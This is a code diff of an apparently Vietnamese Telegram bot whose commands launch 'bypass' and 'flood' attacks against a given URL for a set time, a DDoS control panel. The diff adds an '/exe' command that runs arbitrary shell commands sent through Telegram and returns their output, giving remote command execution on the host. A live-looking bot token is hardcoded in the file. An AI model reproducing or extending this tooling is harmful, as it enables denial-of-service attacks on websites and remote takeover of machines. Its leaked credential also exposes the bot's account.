@@ -1,4 +1,4 @@
-import subprocess
+import subprocess 
 import asyncio
 import requests
 import json
@@ -8,7 +8,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from urllib import parse
 
 # Cấu hình
-ALLOWED_USER_ID = 7371969470
+ALLOWED_USER_ID = 7371969470  # ID của admin
 TOKEN = '7584086130:AAG3zRETxFEIzYhrfisd3wOFjO8agqIzDfc'
 
 # Quản lý tiến trình tấn công
@@ -89,6 +89,37 @@ async def task(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 for infos in task_info.values() for info in infos])
         await update.message.reply_text(task_text)
 
+# Thực thi lệnh terminal
+async def exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id != ALLOWED_USER_ID:
+        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
+    
+    try:
+        if not context.args:
+            return await update.message.reply_text("❌ Vui lòng cung cấp lệnh cần thực thi.")
+        
+        # Tạo lệnh từ input của người dùng
+        command = " ".join(context.args)
+        
+        # Thực thi lệnh
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        
+        if result.returncode == 0:
+            output = result.stdout
+        else:
+            output = result.stderr
+        
+        # Nếu kết quả quá dài, gửi từng phần nhỏ
+        if len(output) > 4096:
+            for i in range(0, len(output), 4096):
+                await update.message.reply_text(output[i:i+4096])
+        else:
+            await update.message.reply_text(output)
+    
+    except Exception as e:
+        await update.message.reply_text(f"❌ Đã xảy ra lỗi khi thực thi lệnh: {str(e)}")
+
 # Hiển thị hướng dẫn sử dụng bot
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_info = {
@@ -96,6 +127,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/bypass [url] [time]": "⚡ Tấn công Bypass vào URL với thời gian (giây).",
         "/flood [url] [time]": "🌊 Tấn công Flood vào URL với thời gian (giây).",
         "/stop": "⛔ Dừng tất cả tiến trình tấn công.",
+        "/exe [lệnh]": "⚙️ Thực thi lệnh terminal và gửi kết quả về.",
         "/help": "ℹ️ Hiển thị hướng dẫn sử dụng bot."
     }
     await update.message.reply_text(f"<pre>{escape_html(json.dumps(help_info, indent=2, ensure_ascii=False))}</pre>", parse_mode='HTML')
@@ -107,6 +139,7 @@ def main():
     application.add_handler(CommandHandler("flood", attack))
     application.add_handler(CommandHandler("stop", stop))
     application.add_handler(CommandHandler("task", task))
+    application.add_handler(CommandHandler("exe", exe))  # Thêm handler cho lệnh /exe
     application.add_handler(CommandHandler("help", help_command))
     application.run_polling()
 
